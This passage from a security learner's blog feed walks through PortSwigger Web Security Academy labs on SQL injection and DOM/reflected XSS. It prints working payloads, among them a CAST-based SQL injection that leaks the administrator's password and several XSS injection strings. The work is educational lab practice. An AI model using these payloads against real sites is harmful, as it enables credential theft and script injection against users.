Just like in my <a href="posts/20240213_wsa_blind_sql_injection_with_conditional_errors.html">previous article</a>, before we go on we need to get some
basic information.
</p>
</div>
</div>
<div id="outline-container-orgf746ad8" class="outline-2">
<h2 id="orgf746ad8"><span class="section-number-2">2.</span> <a href="#orgf746ad8">Getting in position</a></h2>
<div class="outline-text-2" id="text-2">
</div>
<div id="outline-container-org81dda8c" class="outline-3">
<h3 id="org81dda8c"><span class="section-number-3">2.1.</span> <a href="#org81dda8c">SQL Injection Point</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
It is trivial, once again, to see that modifying the value of the
cookie results in an error code, thus signaling that the cookie&rsquo;s
value is the point our payload should be inserted at.
</p>


<div id="orge8e3c77" class="figure">
<p><img src="posts/images/Getting_in_position/20240214_221538_screenshot.png" alt="20240214_221538_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>SQL error through injection in the cookie field</p>
</div>

<p>
By taking a better look at that response, however, we see that it
gives us some more information regarding the error that was produced:
</p>

<pre class="example" id="org0c1e730">
&lt;h4&gt;Unterminated string literal started at position 57 in SQL SELECT * FROM tracking WHERE id = 'TwPUGarplaH8g4da' test'. Expected  char&lt;/h4&gt;
&lt;p class=is-warning&gt;Unterminated string literal started at position 57 in SQL SELECT * FROM tracking WHERE id = 'TwPUGarplaH8g4da' test'. Expected  char&lt;/p&gt;
</pre>

<p>
This behavior, despite providing extremely simple data in this
example, might somehow be exploited.
</p>
</div>
</div>
<div id="outline-container-org168051e" class="outline-3">
<h3 id="org168051e"><span class="section-number-3">2.2.</span> <a href="#org168051e">DBMS enumeration</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
Trying a <code>SELECT null</code> statement in our payload, without a <code>FROM</code> part,
resulted in <code>200 OK</code>, which means that our target DBMS surely is not
Oracle. 
</p>
</div>
</div>
</div>
<div id="outline-container-org666ed6e" class="outline-2">
<h2 id="org666ed6e"><span class="section-number-2">3.</span> <a href="#org666ed6e">He protec he atac he gets the data bac</a></h2>
<div class="outline-text-2" id="text-3">
<p>
After that, we just have to see what to do there. Having completed the
blind version of that room some days before (or was it just
yesterday), I went ahead and dug the following payload from my notes:
</p>

<pre class="example" id="org0c794f5">
UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE null END FROM users--
</pre>

<p>
It needs to be properly tinkered with, to match with our DBMS, but
that is not so difficult. Using the Burp SQLi cheatsheet once again:
</p>

<pre class="example" id="org754a13f">
UNION SELECT CASE WHEN ('b'='a') THEN 1/0 ELSE null END--  
UNION SELECT CASE WHEN ('b'='a') THEN 1/(SELECT 0) ELSE null END--  
UNION SELECT IF('b'='a',1/0,null)--
</pre>

<ol class="org-ol">
<li>Returns 500, <del>ruling out Microsoft DBMS</del></li>
<li>Returns 500, <del>ruling out PostgreSQL</del></li>
<li>Returns 500, (in output function <code>if</code> is shown to be unrecognized),
ruling out MySQL</li>
</ol>

<p>
I had not been paying attention to the error message, but after
repeating the process (with just a little bit more attention now) the
problem was obvious: The input string gets truncated.
</p>


<div id="org2d458d0" class="figure">
<p><img src="posts/images/He_protec_he_atac_he_gets_the_data_bac/20240214_223053_screenshot.png" alt="20240214_223053_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>Truncation POC</p>
</div>


<p>
Not gonna lie: This is the first time I find myself against that.
Deleting the contents of cookie (so that only <code>'</code> is left) makes no
change. The string is too long to be accepted. I need to use shorter
payloads <b>or</b> find a way to overcome that truncation.
</p>
</div>
<div id="outline-container-orga19a405" class="outline-3">
<h3 id="orga19a405"><span class="section-number-3">3.1.</span> <a href="#orga19a405">Trying some stuff out</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
To get a better understanding of the tools in our hands, I started
testing payloads, so that I get more information from the visible
error. One such helpful payload was the following, making a strong
case for why our DBMS is Postgresql (simply: the function <code>PG_SLEEP</code>
gets recognized, even though it does not run due to the wrong syntax)
</p>

<div class="org-src-container">
<pre class="src src-sql" id="org11b6af5">TrackingId=TwPUGarplaH8g4da<span class="org-string">' UNION SELECT PG_SLEEP(1)--;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-orgb9cc1d2" class="outline-3">
<h3 id="orgb9cc1d2"><span class="section-number-3">3.2.</span> <a href="#orgb9cc1d2">Searching for shorter payloads</a></h3>
<div class="outline-text-3" id="text-3-2">
<p>
Heading back to the cheatsheet it has a nice suggestion for exploiting
visible errors, using typecasting.
</p>

<p>
I already know where to look at so:
</p>
<div class="org-src-container">
<pre class="src src-sql" id="orgdb0e725">TrackingId=<span class="org-string">' AND CAST((SELECT username from users limit 1)as int)&lt;0--</span>
</pre>
</div>

<p>
returns
</p>
<pre class="example" id="orgd83ff88">
ERROR: invalid input syntax for type integer: "administrator"
</pre>

<p>
Which means that the first entry in <code>users</code>, is the one of
<code>administrator</code>. Substituting <code>username</code> with <code>password</code> reveals the
password directly in the response (visible error)!
</p>
</div>
</div>
</div>
<div id="outline-container-org69048d6" class="outline-2">
<h2 id="org69048d6"><span class="section-number-2">4.</span> <a href="#org69048d6">Summary</a></h2>
<div class="outline-text-2" id="text-4">
<p>
The way I decided to initially tackle the lab was problematic. Was not
my input length limited, it could have worked, but it would have been
a way more time-consuming process than the one that I finally found.
Visible Errors are a tremendous tool for the tester, since they allow
to easily <i>debug</i> payloads, and fix them accordingly. Taking advantage
of type-casting to conveniently exfiltrate data is certainly
impressive too!
</p>

<p>
Still, this lab got me thinking: I used a payload I consider minimal
yet, had <code>administrator</code> been second (or third or&#x2026;) in the table, I
would not have gotten their password.<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup> Obviously, a different path
could be possible but it feels like strange, depending so much on
luck.
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
What if the input was shortened by just some characters more? Four
or five would be more than enough.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>WSA: Apprentice DOM Based XSS</title>
<link>posts/20240216_wsa_understanding_dom_based_xss.html</link>
<pubDate>Fri, 16 Feb 2024 11:27:00 +0200</pubDate>
<guid>posts/20240216_wsa_understanding_dom_based_xss.html</guid>
<description>
<![CDATA[<div id="outline-container-org774be2d" class="outline-2">
<h2 id="org774be2d"><span class="section-number-2">1.</span> <a href="#org774be2d">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
If you have played around CTFs it is highly likely<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup> that you have
encountered one of the common forms of cross-site scripting (XSS):
</p>
<ul class="org-ul">
<li>Reflected</li>
<li>Stored</li>
</ul>
<p>
And for good reason, since they are (in these scenarios) easy to spot
and can usually be bundled with other techniques for <i>more damage</i>.
</p>

<p>
One other technique, the overlooked one as stated <a href="http://www.webappsec.org/projects/articles/071105.shtml">here</a>, is DOM Based
XSS, which occurs without any extra client-server interaction. In
fact, DOM Based XSS takes advantage of the code that is included in
the web page, and relies on user input to produce a certain outcome.
The code does not (need to?) contact the web server, but manipulates
the page&rsquo;s contents based on a query.
</p>

<p>
In the <a href="#orge454e03">first example</a>, taken from Web Security Academy by PortSwigger,
that query is a search field, but it could be a parameter, or &#x2026; a
hashchange as shown in the last lab. Feel free to make any
corrections/suggestions in the comment section.
</p>
</div>
</div>
<div id="outline-container-orge454e03" class="outline-2">
<h2 id="orge454e03"><span class="section-number-2">2.</span> <a href="#orge454e03">In <code>document.write</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
<div class="outline-text-2" id="text-2">
<div class="org-src-container">
<pre class="src src-js" id="org8e70780"><span class="org-keyword">function</span> <span class="org-function-name">trackSearch</span>(<span class="org-variable-name">query</span>) {
    document.write(<span class="org-string">'&lt;img src="/resources/images/tracker.gif?searchTerms='</span>+query+<span class="org-string">'"&gt;'</span>);
}
<span class="org-keyword">var</span> <span class="org-variable-name">query</span> = (<span class="org-keyword">new</span> <span class="org-type">URLSearchParams</span>(window.location.search)).get(<span class="org-string">'search'</span>);
<span class="org-keyword">if</span>(query) {
    trackSearch(query);
}
</pre>
</div>

<pre class="example" id="orgf88613c">
" onload="alert()
&lt;img src="/resources/images/tracker.gif?searchTerms=" onload="alert()"&gt;
</pre>
</div>
</div>
<div id="outline-container-org4fa575a" class="outline-2">
<h2 id="org4fa575a"><span class="section-number-2">3.</span> <a href="#org4fa575a">In <code>inner.html</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
<div class="outline-text-2" id="text-3">
<p>
After navigating the site just a little bit we see that in the search
page there is this embedded script snippet:
</p>
<div class="org-src-container">
<pre class="src src-js" id="org0c208a0"><span class="org-keyword">function</span> <span class="org-function-name">doSearchQuery</span>(<span class="org-variable-name">query</span>) {
    document.getElementById(<span class="org-string">'searchMessage'</span>).innerHTML = query;
}
<span class="org-keyword">var</span> <span class="org-variable-name">query</span> = (<span class="org-keyword">new</span> <span class="org-type">URLSearchParams</span>(window.location.search)).get(<span class="org-string">'search'</span>);
<span class="org-keyword">if</span>(query) {
    doSearchQuery(query);
}
</pre>
</div>
<p>
We see that it takes the parameter <code>search</code>, and adds its contents
(should they exist) in the <code>innerHTML</code> (namely contents) of an element
with id <code>searchMessage</code>. Seeing the response more carefully: 
</p>

<div class="org-src-container">
<pre class="src src-html" id="org7c92761">&lt;<span class="org-function-name">h1</span>&gt;&lt;<span class="org-function-name">span</span>&gt;0 search results for
'&lt;/<span class="org-function-name">span</span>&gt;&lt;<span class="org-function-name">span</span> <span class="org-variable-name">id</span>=<span class="org-string">"searchMessage"</span>&gt;&lt;/<span class="org-function-name">span</span>&gt;&lt;<span class="org-function-name">span</span>&gt;'&lt;/<span class="org-function-name">span</span>&gt;&lt;/<span class="org-function-name">h1</span>&gt;
</pre>
</div>

<p>
Testing this payload should be more than enough
</p>
<div class="org-src-container">
<pre class="src src-html" id="orga607960">&lt;<span class="org-function-name">script</span>&gt;alert()&lt;/<span class="org-function-name">script</span>&gt;
</pre>
</div>

<p>
While it gets inserted into the page it does not get executed &#x2013;
another payload should be used. And truly, this second one resulted in
a <i>solved lab</i>.
</p>

<div class="org-src-container">
<pre class="src src-html" id="org6ec1faf">&lt;<span class="org-function-name">img</span> <span class="org-variable-name">src</span>=<span class="org-string">"fail"</span> <span class="org-variable-name">onerror</span>=<span class="org-string">"alert(1)"</span>&gt;
</pre>
</div>
</div>
<div id="outline-container-org0807237" class="outline-3">
<h3 id="org0807237"><span class="section-number-3">3.1.</span> <a href="#org0807237">Why did not the first payload work?</a></h3>
</div>
</div>
<div id="outline-container-org0e25450" class="outline-2">
<h2 id="org0e25450"><span class="section-number-2">4.</span> <a href="#org0e25450">In jQuery anchor href&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
<div class="outline-text-2" id="text-4">
<div class="org-src-container">
<pre class="src src-js" id="orged7f91c">$(<span class="org-keyword">function</span>() {
    $(<span class="org-string">'#backLink'</span>).attr(<span class="org-string">"href"</span>, (<span class="org-keyword">new</span> <span class="org-type">URLSearchParams</span>(window.location.search)).get(<span class="org-string">'returnPath'</span>));
});
</pre>
</div>

<p>
This occupies an <code>&lt;a&gt;</code> element&rsquo;s <code>href</code>, found by an <code>id="backLink"</code>.
The thing is that the function being used <code>attr()</code> seems to do a better
sanitization than what we have already seen, escaping ", and &rsquo;, not
allowing with a plain payload to work
</p>
<pre class="example" id="org5e65a49">
#does not work
testaki'&gt; &lt;script&gt;alert()&lt;/script&gt;  
#produced result
&lt;a id="backLink" href="/testaki'&gt; &lt;script&gt;alert()&lt;/script&gt;"&gt;Back&lt;/a&gt; 
</pre>

<p>
Just a little bit of searching (honestly, it was the first
stackoverflow post for me), reminded me of a type of link I had
forgotten: <code>javascript:</code>
</p>

<pre class="example" id="org8506f5c">
javascript:alert(1);
#produced result
&lt;a id="backLink" href="javascript:alert(1);"&gt;Back&lt;/a&gt; 
</pre>

<p>
This, when clicking the button causes the <code>alert()</code> popup window and
successfully marks the lab as solved.
</p>
</div>
</div>
<div id="outline-container-orgff1ab64" class="outline-2">
<h2 id="orgff1ab64"><span class="section-number-2">5.</span> <a href="#orgff1ab64">In jQuery selector sink using a hashchange event&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
<div class="outline-text-2" id="text-5">
<div class="note" id="org718f6f0">
<p>
First time on a room with a <code>Go to exploit server</code> button.
</p>

</div>

<p>
In the website&rsquo;s home page there is this interesting js snippet:
</p>
<div class="org-src-container">
<pre class="src src-js" id="org03f4fad">$(window).on(<span class="org-string">'hashchange'</span>, <span class="org-keyword">function</span>(){
    <span class="org-keyword">var</span> <span class="org-variable-name">post</span> = $(<span class="org-string">'section.blog-list h2:contains('</span> + decodeURIComponent(window.location.hash.slice(1)) + <span class="org-string">')'</span>);
    <span class="org-keyword">if</span> (post) post.get(0).scrollIntoView();
});
</pre>
</div>

<p>
Not knowing JavaScript, but barely understanding through transferring
whatever I could from other languages, this snippet had some work for
me:
</p>
<ul class="org-ul">
<li>What is a <code>hashchange</code> event:
<ul class="org-ul">
<li>If you have ever seen anchors in urls (the snippets starting with
<code>#</code> - feel free to click on a section title in this post and check
the url) you know the entry point</li>
<li>A <code>hashchange</code> event occurs when that <i>parameter</i> changes</li>
</ul></li>
<li>What is <code>$()</code> in general? It is a selector (<a href="https://stackoverflow.com/questions/2167544/what-does-the-function-do-in-javascript">source</a>)
<ul class="org-ul">
<li>Searching in <a href="https://stackoverflow.com/questions/9501886/jquery-javascript-selector-or">StackOverflow</a>, we see that we can add a , to use
multiple selectors (even though I am not sure how this could help
for the time being, since it will only get fed into a <code>scrollIntoView()</code>)</li>
</ul></li>
<li>What exactly does <code>slice(1)</code> do? It returns the string from index 1 to
the end, effectively removing <code>#</code>.</li>
</ul>


<p>
Getting back to the lab: using links of the following form allows to
find the post with that word, and move the screen to that.
</p>
<pre class="example" id="org1d45c04">
https://0aa700fb03d82670856aa9f50084000f.web-security-academy.net/#Reverse
https://0aa700fb03d82670856aa9f50084000f.web-security-academy.net/#Watching
https://0aa700fb03d82670856aa9f50084000f.web-security-academy.net/#Speak
</pre>

<p>
Now that we know what it does, how can we escape from it? My naive payload
does not work, since <code>decodeURIComponent</code> obviously returns a string and
does not just make a substitution.
</p>
<pre class="example" id="org3cbffef">
# what I inserted
/#')');alert(1); //
# what I hoped for
var post = $('section.blog-list h2:contains(' + ')'); alert(1)// + ')');
</pre>

<p>
Searching for <code>hashchange XSS</code> seems to only include results related to
this lab &#x2026; :(
</p>


<p>
Maybe take advantage of the available web server, so that it calls
that one instead?
</p>

<p>
After tinkering for some time, I viewed the solution. It seems silly
to me, because I can not understand how this would not work on any
website. I mean, as far as I can see it does not take advantage of
<code>hashchange</code> at all, just inserts faulty code at the end of the web
page.
</p>
</div>
<div id="outline-container-orgbdd613c" class="outline-3">
<h3 id="orgbdd613c"><span class="section-number-3">5.1.</span> <a href="#orgbdd613c">Update after: <a href="https://www.youtube.com/watch?v=JgiX3kyK8ME">Intigrity explanaation video</a></a></h3>
</div>
</div>
<div id="outline-container-org8bf0ffc" class="outline-2">
<h2 id="org8bf0ffc"><span class="section-number-2">6.</span> <a href="#org8bf0ffc">Summary</a></h2>
<div class="outline-text-2" id="text-6">
<p>
I think I&rsquo;m missing something so, that&rsquo;s enough labs for today, time
for some research and theory. 
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
όπως γνωστός κοσμήτορας ανέφερε τις προηγούμενες ημέρες&#x2026; 
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>WSA Rest of apprentice XSS labs</title>
<link>posts/20240218_wsa_rest_of_apprentice_dom_xss.html</link>
<pubDate>Sun, 18 Feb 2024 23:05:00 +0200</pubDate>
<guid>posts/20240218_wsa_rest_of_apprentice_dom_xss.html</guid>
<description>
<![CDATA[<div id="outline-container-org834cfcd" class="outline-2">
<h2 id="org834cfcd"><span class="section-number-2">1.</span> <a href="#org834cfcd">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Here we are, yet again. Little less than one hour (ideally) before
turning this computer off, starting to work on WSA labs (hoping to
tick some more off today).<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
</p>
</div>
</div>
<div id="outline-container-orgc65f490" class="outline-2">
<h2 id="orgc65f490"><span class="section-number-2">2.</span> <a href="#orgc65f490">Lab 1: Reflected XSS into attribute with angle brackets HTML-encoded</a></h2>
<div class="outline-text-2" id="text-2">
<p>
You can check the lab out: <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded">here</a>
</p>

<p>
Quickly we can see that the search field is where we should focus our
attention. Checking the source code after some attempts, it becomes
apparent that we can modify our input so that it adds a parameter and
<code>onmouseover</code> just does the job
</p>


<div id="org4ce9ac2" class="figure">
<p><img src="posts/images/Lab_1:_Reflected_XSS_into_attribute_with_angle_brackets_HTML-encoded/20240219_092926_screenshot.png" alt="20240219_092926_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Solving it</p>
</div>
</div>
</div>
<div id="outline-container-org73d61ce" class="outline-2">
<h2 id="org73d61ce"><span class="section-number-2">3.</span> <a href="#org73d61ce">Lab 2: Stored XSS into anchor href attribute with double quotes HTML-encoded</a></h2>
<div class="outline-text-2" id="text-3">
<p>
You can check the lab out: <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded">here</a>
</p>

<p>
This one is fairly easy. Heading to the comment section we can see
that there are some input fields that are available to us. The only
thing that <b>needs attention</b> here is to <b>use all available parameters</b>.
This one took some more time than I would like to admit, because of my
tendency to supply as little info as possible: I had not entered
nothing in the website field, which is critical for this lab.
</p>

<p>
Plain old JavaScript links do the job:
</p>
<pre class="example" id="orgfeb7dad">
javascript:alert(1)
</pre>


<div id="orga32f62f" class="figure">
<p><img src="posts/images/Lab_2:_Stored_XSS_into_anchor_href_attribute_with_double_quotes_HTML-encoded/20240219_093544_screenshot.png" alt="20240219_093544_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>Now, old comment section</p>
</div>
</div>
</div>
<div id="outline-container-org922f115" class="outline-2">
<h2 id="org922f115"><span class="section-number-2">4.</span> <a href="#org922f115">Lab 3:  Reflected XSS into a JavaScript string with angle brackets HTML encoded</a></h2>
<div class="outline-text-2" id="text-4">
<p>
You can check the lab out: <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded">here</a>
</p>

<p>
Checking out the website&rsquo;s source code we see that there exists this
snippet, which is of interest since it handles our input:
</p>
<div class="org-src-container">
<pre class="src src-js" id="org86e37c0"><span class="org-keyword">var</span> <span class="org-variable-name">searchTerms</span> = <span class="org-string">'" test'</span>;
document.write(<span class="org-string">'&lt;img src="/resources/images/tracker.gif?searchTerms='</span>+encodeURIComponent(searchTerms)+<span class="org-string">'"&gt;'</span>);
</pre>
</div>

<p>
I&rsquo;m seeking of a payload in the following form:<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>
</p>
<pre class="example" id="orge377720">
' onerror="alert(1)" '
</pre>

<p>
The thing, is though, that:
</p>
<ol class="org-ol">
<li>This invalidates the <code>var</code> assignment</li>
<li>The usage of <code>encodeURIComponent</code>, really messes up our input.</li>
</ol>


<p>
There I was, thinking of a possible solution to overcome those two
problems when it finally got to me: the first one is no problem.
Instead, I can just add <b>as many commands</b> as I want there, separated by
<code>;</code>. The only thing I need to pay attention to is to comment out the
last part of the line to avoid the remaining <code>'</code> causing any problems.
</p>



<div id="orge083684" class="figure">
<p><img src="posts/images/Lab_3:/20240219_110149_screenshot.png" alt="20240219_110149_screenshot.png">
</p>
<p><span class="figure-number">Figure 3: </span>Solution</p>
</div>
</div>
</div>
<div id="outline-container-org5e24ab9" class="outline-2">
<h2 id="org5e24ab9"><span class="section-number-2">5.</span> <a href="#org5e24ab9">Summary</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Last week when I wrote my
<a href="posts/20240213_wsa_blind_sql_injection_with_conditional_errors.html#orgbe49e47">first wsa walkthrough</a> I set a goal of completing
210 labs in this semester. I am afraid that it might be a little too
much for someone with a schedule like mine, but I think it is viable.
Sticking to it.
</p>

<blockquote>
<p>
Stating this here, I aim to complete at least 210 labs (roughly 80% of
the ones available in the website) by the end of May.
</p>
</blockquote>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Long story short &#x2026; things did not exactly go that way. 
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Good but newbie, as shown first idea. 
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>WSA: DOM XSS in AngularJS expression</title>
<link>posts/20240227_wsa_dom_xss_in_angularjs_expression.html</link>
<pubDate>Tue, 27 Feb 2024 11:21:00 +0200</pubDate>
<guid>posts/20240227_wsa_dom_xss_in_angularjs_expression.html</guid>
<description>
<![CDATA[<div id="outline-container-orga398240" class="outline-2">
<h2 id="orga398240"><span class="section-number-2">1.</span> <a href="#orga398240">Challenge</a></h2>
<div class="outline-text-2" id="text-1">
<p>
You can check the lab out: <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression">here</a>
</p>

<p>
Having to deal with AngularJS, we know that we should pay special
attention to all elements with a <code>ng-sth</code> attribute, since that is
linked to Angular.
</p>

<p>
There is a search functionality, a good starting place, and the text
which we supply gets shown in the source code:
</p>


<div id="org5791a5d" class="figure">
<p><img src="posts/images/Challenge/20240227_112515_screenshot.png" alt="20240227_112515_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Sample Input</p>
</div>
</div>
<div id="outline-container-orgb2c8ebe" class="outline-3">
<h3 id="orgb2c8ebe"><span class="section-number-3">1.1.</span> <a href="#orgb2c8ebe">Vulnerable part</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
We can <i>verify</i> that the website uses angular:
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span class="org-function-name">body</span> <span class="org-variable-name">ng-app</span>=<span class="org-string">""</span> <span class="org-variable-name">class</span>=<span class="org-string">"ng-scope"</span>&gt;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-html" id="org37fb430">&lt;<span class="org-function-name">section</span> <span class="org-variable-name">class</span>=<span class="org-string">"search"</span>&gt;
  &lt;<span class="org-function-name">form</span> <span class="org-variable-name">action</span>=<span class="org-string">"/"</span> <span class="org-variable-name">method</span>=<span class="org-string">"GET"</span> <span class="org-variable-name">class</span>=<span class="org-string">"ng-pristine ng-valid"</span>&gt;
    &lt;<span class="org-function-name">input</span> <span class="org-variable-name">type</span>=<span class="org-string">"text"</span> <span class="org-variable-name">placeholder</span>=<span class="org-string">"Search the blog..."</span> <span class="org-variable-name">name</span>=<span class="org-string">"search"</span>&gt;
    &lt;<span class="org-function-name">button</span> <span class="org-variable-name">type</span>=<span class="org-string">"submit"</span> <span class="org-variable-name">class</span>=<span class="org-string">"button"</span>&gt;Search&lt;/<span class="org-function-name">button</span>&gt;
  &lt;/<span class="org-function-name">form</span>&gt;
&lt;/<span class="org-function-name">section</span>&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-orgd4b09a0" class="outline-3">
<h3 id="orgd4b09a0"><span class="section-number-3">1.2.</span> <a href="#orgd4b09a0">Solution</a></h3>
<div class="outline-text-3" id="text-1-2">
<p>
After playing around, testing <code>{{alert(1)}}</code> and similar naive payloads
:P, then checking out the documentation for ways to effectively use
<code>{{}}</code> to our advantage, the solution was given by <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md">PayloadsAllTheThings</a>.
</p>

<pre class="example" id="org905deb8">
{{constructor.constructor('alert(1)')()}}
</pre>
</div>
</div>
<div id="outline-container-orgb209b17" class="outline-3">
<h3 id="orgb209b17"><span class="section-number-3">1.3.</span> <a href="#orgb209b17">Note on Angular</a></h3>
<div class="outline-text-3" id="text-1-3">
<p>
For more info check out:
</p>
<ol class="org-ol">
<li><a href="https://docs.angularjs.org/tutorial/step_02">https://docs.angularjs.org/tutorial/step_02</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md">PayloadsAllTheThings: XSS In AngularJS</a></li>
</ol>
</div>
</div>
</div>
<div id="outline-container-orga7667b5" class="outline-2">
<h2 id="orga7667b5"><span class="section-number-2">2.</span> <a href="#orga7667b5">Summary</a></h2>
<div class="outline-text-2" id="text-2">
<p>
And another one gone, and another one gone&#x2026; Another one bites the dust 
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>WSA: DOM XSS in document.write sink using source location.search</title>
<link>posts/20240227_wsa_dom_xss_in_select.html</link>
<pubDate>Tue, 27 Feb 2024 10:07:00 +0200</pubDate>
<guid>posts/20240227_wsa_dom_xss_in_select.html</guid>
<description>
<![CDATA[<div id="outline-container-org58a210b" class="outline-2">
<h2 id="org58a210b"><span class="section-number-2">1.</span> <a href="#org58a210b">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Not much to say here, just glad to have found some time for challenges ;P
</p>
</div>
</div>
<div id="outline-container-orgb8dab83" class="outline-2">
<h2 id="orgb8dab83"><span class="section-number-2">2.</span> <a href="#orgb8dab83">Challenge</a></h2>
<div class="outline-text-2" id="text-2">
<p>
You can check the lab out: <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element">here</a>
</p>

<p>
Starting with the usual progress, checking stuff, while allowing all
traffic through our proxy to be able to replicate any requests later
on. <sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
</p>

<p>
In each product page there is a &ldquo;Check Stock&rdquo; functionality, which
after previewing the source code, is handled by the following
javascript snippet:
</p>
<div class="org-src-container">
<pre class="src src-javascript" id="org7b6e564"><span class="org-keyword">var</span> <span class="org-variable-name">stores</span> = [<span class="org-string">"London"</span>,<span class="org-string">"Paris"</span>,<span class="org-string">"Milan"</span>];
<span class="org-keyword">var</span> <span class="org-variable-name">store</span> = (<span class="org-keyword">new</span> <span class="org-type">URLSearchParams</span>(window.location.search)).get(<span class="org-string">'storeId'</span>);
document.write(<span class="org-string">'&lt;select name="storeId"&gt;'</span>);
<span class="org-keyword">if</span>(store) {
    document.write(<span class="org-string">'&lt;option selected&gt;'</span>+store+<span class="org-string">'&lt;/option&gt;'</span>);
}
<span class="org-keyword">for</span>(<span class="org-keyword">var</span> <span class="org-variable-name">i</span>=0;i&lt;stores.length;i++) {
    <span class="org-keyword">if</span>(stores[i] === store) {
        <span class="org-keyword">continue</span>;
    }
    document.write(<span class="org-string">'&lt;option&gt;'</span>+stores[i]+<span class="org-string">'&lt;/option&gt;'</span>);
}
document.write(<span class="org-string">'&lt;/select&gt;'</span>);
</pre>
</div>

<p>
In our request we can see that, the variables can be modified:
</p>
<pre class="example" id="orgb8709a8">
productId=1&amp;storeId=London
</pre>

<p>
Sample link that gives us the desired output in console:
</p>
<pre class="example" id="org9a27749">
https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?productId=1&amp;storeId=asdfasdf
</pre>

<p>
After that it was tedious: We just had to get out of the existing
environments and add a script one:
</p>
<pre class="example" id="orgdeaa148">
https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?productId=1&amp;storeId=&lt;/option&gt;&lt;/select&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</pre>
</div>
</div>
<div id="outline-container-orga6e0ac4" class="outline-2">
<h2 id="orga6e0ac4"><span class="section-number-2">3.</span> <a href="#orga6e0ac4">Summary</a></h2>
<div class="outline-text-2" id="text-3">
<p>
This was the first challenge I completed for the day, and I think it
was the perfect way to start it: not too easy, but at the same time
not too difficult.
</p>

<p>
Paying some attention to the vulnerable snippet was all that was
needed here!
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Not really necessary, knowing that we check for DOM XSS but all is fine. 
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>WSA: Reflected DOM XSS</title>
<link>posts/20240227_wsa_reflected_dom_xss.html</link>
<pubDate>Tue, 27 Feb 2024 11:41:00 +0200</pubDate>
<guid>posts/20240227_wsa_reflected_dom_xss.html</guid>
<description>
<![CDATA[<div id="outline-container-org243a5fc" class="outline-2">
<h2 id="org243a5fc"><span class="section-number-2">1.</span> <a href="#org243a5fc">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
This was the most interesting XSS lab I think I have seen so far. Not
only did it made me dig a little bit deeper than the others, which
could have been due to overlooking <code>eval()</code>, but it also had a fun part
of thinking out of the box: developing a payload, no matter how little
time it takes, is always satisfying in the end!
</p>
</div>
</div>
<div id="outline-container-orgf7a39a7" class="outline-2">
<h2 id="orgf7a39a7"><span class="section-number-2">2.</span> <a href="#orgf7a39a7">Challenge</a></h2>
<div class="outline-text-2" id="text-2">
<p>
